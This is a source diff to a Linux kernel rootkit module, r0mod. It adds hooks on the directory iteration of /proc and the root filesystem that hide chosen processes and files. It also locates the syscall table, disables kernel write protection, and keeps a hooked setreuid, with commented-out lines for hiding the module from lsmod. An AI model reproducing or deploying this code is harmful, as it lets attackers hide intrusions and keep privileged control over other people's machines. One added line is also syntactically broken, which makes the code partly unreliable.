@@ -14,21 +14,83 @@
 #define SEARCH_START    PAGE_OFFSET
 #define SEARCH_END      ULONG_MAX //PAGE_OFFSET + 0xffffffff
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+#else
+static int (*proc_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
+static int (*root_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
+#endif
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
+static int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
+static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
+#define ITERATE_NAME readdir
+#define ITERATE_PROTO struct file *file, void *dirent, filldir_t filldir
+#define FILLDIR_VAR filldir
+#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \
+{                                                   \
+    ret = ITERATE_FUNC(file, dirent, &FILLDIR_FUNC);\
+}
+#else
+static int (*proc_iterate)(struct file *file, struct dir_context *);
+static int (*root_iterate)(struct file *file, struct dir_context *);
+#define ITERATE_NAME iterate
+#define ITERATE_PROTO struct file *file, struct dir_context *ctx
+#define FILLDIR_VAR ctx->actor
+#define REPLACE_FILLDIR(ITERATE_FUNC, FILLDIR_FUNC) \
+{                                                   \
+    *((filldir_t *)&ctx->actor) = &FILLDIR_FUNC;    \
+    ret = ITERATE_FUNC(file, ctx);                  \
+}
+#endif
+
 unsigned long *sct;
 unsigned long *ia32_sct;
 
+struct s_proc_args
+{
+    unsigned short pid;
+};
+
+struct s_file_args
+{
+    unsigned short namelen;
+    char *name;
+};
+
+struct s_args
+{
+    void *ptr;
+    unsigned short cmd;
+};
+
+struct hidden_proc {
+    unsigned short pid;
+    struct list_head list;
+};
+
+LIST_HEAD(hidden_procs);
+
+struct hidden_file {
+    char *name;
+    struct list_head list;
+};
+
+LIST_HEAD(hidden_files);
+
 struct
 {
-    unsigned short limit;
     unsigned long base;
+    unsigned short limit;
 } __attribute__ ((packed))idtr;
 
 struct
 {
     unsigned short off1;
+    unsigned short off2;
     unsigned short sel;
     unsigned char none, flags;
-    unsigned short off2;
 } __attribute__ ((packed))idt;
 
 asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
@@ -47,20 +109,7 @@ asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
     return orig_setreuid(ruid, euid);
 }
 
-void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size)
-{
-    char *p;
-
-    for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++)
-    {
-        if(memcmp(p, needle, needle_size) == 0)
-            return (void *)p;
-    }
-
-    return NULL;
-}
-
-#if defined(__i386__)
+#if defined(_CONFIG_X86_)
 // Phrack #58 0x07; sd, devik
 unsigned long *find_sct(void)
 {
@@ -80,7 +129,7 @@ unsigned long *find_sct(void)
     else
         return NULL;
 }
-#elif defined(__x86_64__)
+#elif defined(_CONFIG_X86_64_)
 // http://bbs.chinaunix.net/thread-2143235-1-1.html
 unsigned long *find_sct(void)
 {
@@ -152,37 +201,221 @@ unsigned long *locate_sct_by_addr_scan(void)
     return NULL;
 }
 
+void *get_vfs_iterate(const char *path)
+{
+    void *ret;
+
+    struct file *filep;
+
+    if((filep = filp_open(path, O_RDONLY, 0)) == NULL)
+        return NULL;
+
+    ret = filep->f_op->ITERATE_NAME;
+
+    filp_close(filep, 0);
+
+    return ret;
+}
+
+void *get_vfs_read(const char *path)
+{
+    void *ret;
+
+    struct file *filep;
+
+    if((filep = filp_open(path, O_RDONLY, 0)) == NULL)
+        return NULL;
+
+    ret = filep->f_op->read;
+
+    filp_close(filep, 0);
+
+    return ret;
+}
+
+void hide_file ( char *name )
+{
+    struct hidden_file *hf;
+
+    hf = kmalloc(sizeof(*hf), GFP_KERNEL);
+    if ( ! hf )
+        return;
+
+    hf->name = name;
+
+    list_add(&hf->list, &hidden_files);
+}
+
+void unhide_file ( char *name )
+{
+    struct hidden_file *hf;
+
+    list_for_each_entry ( hf, &hidden_files, list )
+    {
+        if ( ! strcmp(name, hf->name) )
+        {
+            list_del(&hf->list);
+            kfree(hf->name);
+            kfree(hf);
+            break;
+        }
+    }
+}
+
+void hide_proc ( unsigned short pid )
+{
+    struct hidden_proc *hp;
+
+    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
+    if ( ! hp )
+        return;
+
+    hp->pid = pid;
+
+    list_add(&hp->list, &hidden_procs);
+}
+
+void unhide_proc ( unsigned short pid )
+{
+    struct hidden_proc *hp;
+
+    list_for_each_entry ( hp, &hidden_procs, list )
+    {
+        if ( pid == hp->pid )
+        {
+            list_del(&hp->list);
+            kfree(hp);
+            break;
+        }
+    }
+}
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+static int n_root_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
+{
+    struct hidden_file *hf;
+
+    list_for_each_entry(hf, &hidden_files, list)
+    {
+        if(!strcmp(name, hf->name))
+            return 0;
+    }
+
+    return root_filldir(__buf, name, namelen, offset, ino, d_type);
+}
+#else
+static int n_root_filldir(struct dir_context *nrf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
+{
+    struct hidden_file *hf;
+
+    list_for_each_entry(hf, &hidden_files, list)
+    {
+        if(!strcmp(name, hf->name))
+            return 0;
+    }
+
+    return root_filldir(nrf_ctx, name, namelen, offset, ino, d_type);
+}
+#endif
+
+int n_root_iterate(ITERATE_PROTO)
+{
+    int ret;
+
+    root_filldir = FILLDIR_VAR;
+
+    hijack_pause(root_iterate);
+    REPLACE_FILLDIR(root_iterate, n_root_filldir);
+    hijack_resume(root_iterate);
+
+    return ret;
+}
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
+{
+    struct hidden_proc *hp;
+    char *endp;
+    long pid;
+
+    pid = simple_strtol(name, &endp, 10);
+
+    list_for_each_entry ( hp, &hidden_procs, list )
+        if ( pid == hp->pid )
+            return 0;
+
+    return proc_filldir(__buf, name, namelen, offset, ino, d_type);
+}
+#else
+static int n_proc_filldir( struct dir_context *npf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
+{
+    struct hidden_proc *hp;
+    char *endp;
+    long pid;
+
+    pid = simple_strtol(name, &endp, 10);
+
+    list_for_each_entry ( hp, &hidden_procs, list )
+        if ( pid == hp->pid )
+            return 0;
+
+    return proc_filldir(npf_ctx, name, namelen, offset, ino, d_type);
+}
+#endif
+
+int n_proc_iterate(ITERATE_PROTO)
+{
+    int ret;
+
+    proc_filldir = FILLDIR_VAR;
+
+    hijack_pause(proc_iterate);
+    REPLACE_FILLDIR(proc_iterate, n_proc_filldir);
+    hijack_resume(proc_iterate);
+
+    return ret;
+}
+
 static int __init r0mod_init(void)
 {
-    printk("Module starting...\n");
+    DEBUG("Module starting...\n");
 
-    //printk("Hiding module object.\n");
+    //DEBUG("Hiding module object.\n");
     //list_del_init(&__this_module.list);               // Remove from lsmod
     //kobject_del(&THIS_MODULE->mkobj.kobj);            // Remove from FS?
     //kobject_del(&THIS_MODULE->holders_dir->parent);   // Remove from FS?
 
-    printk("Search Start: %lx\n", SEARCH_START);
-    printk("Search End:   %lx\n", SEARCH_END);
+    DEBUG("Search Start: %lx\n", SEARCH_START);
+    DEBUG("Search End:   %lx\n", SEARCH_END);
 
-#if defined(__x86_64__)
+#if defined(_CONFIG_X86_64_)
     if((ia32_sct = (void *)find_ia32_sct()) == NULL)
-        printk("ia32_sct == NULL");
+        DEBUG"ia32_sct == NULL");
 #endif
 
     if((sct = (void *)find_sct()) == NULL)
-        printk("sct == NULL\n");
+        DEBUG("sct == NULL\n");
 
-#if defined(__x86_64__)
-    printk("ia32_sct hooked @ %lx\n", (unsigned long)ia32_sct);
+#if defined(_CONFIG_X86_64_)
+    if(ia32_sct != NULL)
+        DEBUG("ia32_sct hooked @ %lx\n", (unsigned long)ia32_sct);
 #endif
+    if(sct != NULL)
+        DEBUG("sct hooked @ %lx\n", (unsigned long)sct);
 
-    printk("sct hooked @ %lx\n", (unsigned long)sct);
-
-    if(sct == NULL && ia32_sct == NULL)
+    if(ia32_sct == NULL && sct == NULL)
     {
-        printk("sct && ia32_sct == NULL ... Exiting!\n");
+        DEBUG("ia32_sct && sct == NULL ... Exiting!\n");
         return -1;
     }
+
+    /* Hook /proc for hiding processes */
+    proc_iterate = get_vfs_iterate("/proc");
+    hijack_start(proc_iterate, &n_proc_iterate);
+
+    /* Hook / for hiding files and directories */
+    root_iterate = get_vfs_iterate("/");
+    hijack_start(root_iterate, &n_root_iterate);
 
     write_cr0(read_cr0() & (~0x10000));
 
@@ -197,7 +430,7 @@ static int __init r0mod_init(void)
 
 static void __exit r0mod_exit(void)
 {
-    printk("Module ending...\n");
+    DEBUG("Module ending...\n");
 
     if(sct != NULL)
     {
@@ -207,6 +440,9 @@ static void __exit r0mod_exit(void)
 
         write_cr0(read_cr0() | 0x10000);
     }
+
+    hijack_stop(root_iterate);
+    hijack_stop(proc_iterate);
 }
 
 MODULE_LICENSE("GPL");
